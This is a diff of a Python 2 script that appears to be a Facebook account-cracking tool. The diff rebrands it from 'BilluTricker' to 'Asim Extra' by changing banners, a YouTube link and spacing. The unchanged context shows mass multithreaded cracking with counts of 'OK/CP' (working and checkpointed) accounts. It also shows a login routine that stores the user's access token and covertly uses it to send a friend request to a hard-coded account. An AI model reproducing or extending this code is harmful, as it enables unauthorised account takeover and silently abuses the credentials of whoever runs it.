@@ -165,7 +165,7 @@ jalan("\033[1;95m---------------------\|[¤]|] ")
 jalan("\033[1;95m----------------------\\¤// ")
 jalan("\033[1;95m-----------------------\|/ ")
 jalan("\033[1;95m------------------------V ")                                     
-jalan('\033[1;91m    Toll Update 100%   Welcome to BilluTricker')
+jalan('\033[1;91m    Toll Update 100%   Welcome to Asim Extra')
 print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mAsimExtra\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 
 CorrectUsername = "Asim"
@@ -230,7 +230,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;95mLogin Successful.•◈•..'
-				os.system('xdg-open https://www.youtube.com/channel/UCzEDJq-N-CjDzepos5CV0_g')
+				os.system('xdg-open https://www.youtube.com/c/AsimPardasi')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -503,7 +503,7 @@ def pilih_super():
 		
 	p = ThreadPool(50)
 	p.map(main, id)
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBilluTeicker\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mAsim Extra\033[1;95m•◈•▬ ▬ ▬ ▬ ▬•◈•"
 	print "  \033[1;91m«---•◈•---Developed By M Asim--•◈•---»" #Dev:Asim_Ch
 	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 v1.py)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;95m"+str(len(cekpoint))
@@ -528,7 +528,7 @@ def pilih_super():
                        Checkpoint ID Open After 7 Days
 
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;91m ....Asim Pardasi Asim                            Extra....... \033[1;95m :
+: \033[1;91m ....Asim Pardasi Asim Extra....... \033[1;95m :
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Group
               \033[1;91m https://chat.whatsapp.com/LWfOnjGmnRd9Qjz6pqJYDt"""
